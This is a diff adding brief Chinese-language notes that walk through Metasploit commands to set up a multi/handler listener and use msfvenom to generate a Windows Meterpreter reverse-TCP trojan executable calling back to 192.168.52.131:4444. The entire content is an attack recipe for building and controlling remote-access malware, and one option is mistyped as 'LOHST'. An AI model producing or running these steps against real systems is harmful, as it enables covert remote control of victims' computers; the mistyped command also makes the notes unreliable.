@@ -1,0 +1,25 @@
+启动终端
+msfconsole -q  
+
+打开监听与payload目录
+use exploit/multi/handler
+
+设置主机ip
+set LHOST 192.168.52.131
+
+设置Payload
+set payload windows/meterpreter/reverse_tcp
+
+显示主机设置
+show options
+
+显示payload
+show payloads
+
+（另外一个终端)生成木马
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows -o ./meter_re_tcp_x86.exe LOHST=192.168.52.131 LPORT=4444
+
+（控制终端)打开监听
+Run/exploit
+
+msfconsole -r ""读取文件执行
